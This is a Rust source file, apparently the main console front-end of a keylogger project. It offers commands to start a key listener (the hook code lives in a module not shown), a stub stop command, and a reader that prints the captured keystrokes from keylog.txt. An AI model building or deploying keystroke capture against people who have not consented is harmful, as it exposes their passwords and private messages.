mod hook_procedure;
mod structs;

use std::io::{self, BufReader, Read, Write};
use std::fs::File;
use std::process;
use clap::Parser;
use structs::Commands;
use hook_procedure::run_keylogger;
use crate::structs::KeyloggerCommands;

fn main() {
    println!("Welcome to the keylogger!");
    loop {
        print!("logger (;> ");
        io::stdout().flush().unwrap();

        let mut command = String::new();
        io::stdin().read_line(&mut command).expect("Failed to read line");
        let command = command.trim();
        
        if command.is_empty() {
            continue;
        }
        
        if command.trim().to_ascii_lowercase() == "quit" || command.trim().to_ascii_lowercase() == "exit" {
            break;
        }

        let args = match shlex::split(command) {
            Some(args) => args,
            None => {
                println!("Invalid command syntax");
                continue;
            }
        };

        let args_refs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();
        

        // Pre append "logger" first so that our command doesn't get omitted as the first argument.
        match KeyloggerCommands::try_parse_from(std::iter::once("logger").chain(args_refs)) {
            Ok(cmd) => handle_commands(cmd.command),
            Err(error) => println!("Error: {}", error),
        }
    }
}

fn handle_commands(command: Commands) {
    match command {
        Commands::QuitProgram => {
            println!("Exiting program...");
            process::exit(0);
        }
        Commands::StartKeyListener => {
            println!("Starting key listener...");
            run_keylogger();
        }
        Commands::StopKeyListener => {
            println!("Stopping key listener...");
            // Logic to stop the key listener would go here
        }
        Commands::ShowLogs { verbose } => {
            println!("Showing logs...");
            if let Err(error) = read_logs(verbose) {
                println!("Error: {}", error); // TODO: Add flag for verbose and non verbose errors.
            }
        }
    }
}

fn read_logs(verbose: bool) -> io::Result<()> {
    let file = File::open("keylog.txt")?;
    
    let mut reader = BufReader::new(&file);
    let mut contents = String::new();
    reader.read_to_string(&mut contents)?;

    if contents.len() == 0 {
        println!("No logs were found...");
        return Ok(())
    }

    if verbose {
        use chrono::prelude::DateTime;
        use chrono::Utc;
        let metadata = file.metadata()?;
        let datetime = DateTime::<Utc>::from(metadata.modified()?).format("%Y-%m-%d %H:%M:%S.%f");
        
        contents.push_str(&format!("\n\nfile size: {} bytes\nlast date modified: {}", metadata.len(), datetime));
    }
    
    println!("{}", contents);

    Ok(())
}